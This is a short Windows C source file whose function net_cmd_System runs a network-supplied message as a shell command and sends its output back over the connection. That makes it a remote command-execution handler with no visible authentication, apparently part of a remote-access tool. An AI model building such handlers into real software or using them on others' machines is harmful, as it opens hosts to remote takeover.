#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <dirent.h>
#include "types.h"
#include "net/interface.h"
#include "net/commands.h"

int net_cmd_System(char* msg, int msgLen)
{
	FILE *f = popen(msg, "r");
	char buff[256];

	while(fgets(buff, sizeof(buff), f) != 0) 
	{
		if(net_SendData(buff, strlen(buff)) < 1)
		{
			return -1;
		}		
	}

	pclose(f);

	memset(buff, 0, 256);
	buff[0] = NET_CMD_SYSTEM;

	if(net_SendData(buff, 2) < 1)
	{
		return -1;
	}

	return 1;
}